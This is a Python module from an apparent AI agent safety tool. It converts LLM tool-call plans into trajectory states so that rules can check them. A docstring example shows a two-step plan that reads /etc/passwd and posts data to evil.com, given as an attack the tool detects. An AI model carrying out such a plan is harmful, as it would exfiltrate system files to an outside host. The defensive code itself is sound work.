"""
Trajectory extraction.

Converts tool call plans from LLM planners into evaluable
state representations for reachability analysis.

Supports:

- OpenAI function calling format
- LangChain tool call format
- Raw dict format
- Custom formats via adapters
"""

import hashlib
import json
from dataclasses import dataclass, field
from typing import Any, Optional


@dataclass
class TrajectoryState:
    """
    A single state in an executable trajectory.

    Attributes:
        tool: name of the tool being called
        args: arguments / parameters for the tool call
        step: position in a multi-step trajectory (0-indexed)
        context: accumulated context from prior steps
        raw: original unprocessed tool call data
    """

    tool: str
    args: dict = field(default_factory=dict)
    step: int = 0
    context: dict = field(default_factory=dict)
    raw: Optional[dict] = None

    def to_eval_dict(self) -> dict:
        """Flatten to evaluation dict for Ω rule checking."""
        flat = {
            "tool": self.tool,
            "args": json.dumps(self.args) if self.args else "",
            "step": self.step,
            **self.context,
            **self.args,
        }
        return flat

    @property
    def hash(self) -> str:
        """Deterministic hash for audit logging."""
        content = json.dumps(
            {"tool": self.tool, "args": self.args, "step": self.step},
            sort_keys=True,
        )
        return hashlib.sha256(content.encode()).hexdigest()[:16]


@dataclass
class Trajectory:
    """
    An ordered sequence of states representing an executable plan.
    """

    states: list[TrajectoryState] = field(default_factory=list)

    @property
    def hash(self) -> str:
        content = json.dumps(
            [{"tool": s.tool, "args": s.args, "step": s.step} for s in self.states],
            sort_keys=True,
        )
        return hashlib.sha256(content.encode()).hexdigest()[:16]

    @property
    def is_multi_step(self) -> bool:
        return len(self.states) > 1

    def __len__(self) -> int:
        return len(self.states)

    def __iter__(self):
        return iter(self.states)


class TrajectoryExtractor:
    """
    Extracts evaluable trajectories from LLM planner outputs.

    Supports multiple input formats:

        # OpenAI function calling
        extractor = TrajectoryExtractor()
        trajectory = extractor.from_openai(response.choices[0].message.tool_calls)

        # LangChain
        trajectory = extractor.from_langchain(agent_action)

        # Raw dict
        trajectory = extractor.from_dict({"tool": "send_email", "args": {...}})

        # Multi-step plan
        trajectory = extractor.from_plan([
            {"tool": "read_file", "args": {"path": "/etc/passwd"}},
            {"tool": "http_request", "args": {"url": "https://evil.com", "body": "..."}},
        ])
    """

    def __init__(self, context: Optional[dict] = None):
        """
        Args:
            context: persistent context applied to all extracted states
                     (e.g. user role, session metadata, authorization flags)
        """
        self.context = context or {}

    def from_dict(self, tool_call: dict) -> Trajectory:
        """Extract trajectory from a single tool call dict."""
        # Extract known keys
        tool_keys = {"tool", "name", "function", "args", "arguments", "input"}
        extra_context = {
            k: v for k, v in tool_call.items() if k not in tool_keys
        }
        merged_context = {**self.context, **extra_context}

        state = TrajectoryState(
            tool=tool_call.get("tool", tool_call.get("name", tool_call.get("function", "unknown"))),
            args=tool_call.get("args", tool_call.get("arguments", tool_call.get("input", {}))),
            step=0,
            context=merged_context,
            raw=tool_call,
        )
        # Parse string args
        if isinstance(state.args, str):
            try:
                state.args = json.loads(state.args)
            except (json.JSONDecodeError, TypeError):
                state.args = {"raw": state.args}

        return Trajectory(states=[state])

    def from_plan(self, steps: list[dict]) -> Trajectory:
        """Extract trajectory from a multi-step tool call plan."""
        states = []
        accumulated_context = self.context.copy()

        for i, step in enumerate(steps):
            state = TrajectoryState(
                tool=step.get("tool", step.get("name", "unknown")),
                args=step.get("args", step.get("arguments", step.get("input", {}))),
                step=i,
                context=accumulated_context.copy(),
                raw=step,
            )
            if isinstance(state.args, str):
                try:
                    state.args = json.loads(state.args)
                except (json.JSONDecodeError, TypeError):
                    state.args = {"raw": state.args}

            states.append(state)

            # Accumulate context across steps (chained attack detection)
            accumulated_context[f"step_{i}_tool"] = state.tool
            accumulated_context[f"step_{i}_args"] = state.args

        return Trajectory(states=states)

    def from_openai(self, tool_calls: list) -> Trajectory:
        """Extract trajectory from OpenAI function calling response."""
        steps = []
        for tc in tool_calls:
            if hasattr(tc, "function"):
                # OpenAI ChatCompletion tool_call object
                args = tc.function.arguments
                if isinstance(args, str):
                    try:
                        args = json.loads(args)
                    except (json.JSONDecodeError, TypeError):
                        args = {"raw": args}
                steps.append({"tool": tc.function.name, "args": args})
            elif isinstance(tc, dict):
                func = tc.get("function", {})
                steps.append({
                    "tool": func.get("name", tc.get("name", "unknown")),
                    "args": func.get("arguments", tc.get("args", {})),
                })
        return self.from_plan(steps)

    def from_langchain(self, agent_actions: Any) -> Trajectory:
        """Extract trajectory from LangChain AgentAction(s)."""
        if not isinstance(agent_actions, list):
            agent_actions = [agent_actions]

        steps = []
        for action in agent_actions:
            if hasattr(action, "tool") and hasattr(action, "tool_input"):
                steps.append({"tool": action.tool, "args": action.tool_input})
            elif isinstance(action, dict):
                steps.append({
                    "tool": action.get("tool", "unknown"),
                    "args": action.get("tool_input", action.get("args", {})),
                })
        return self.from_plan(steps)
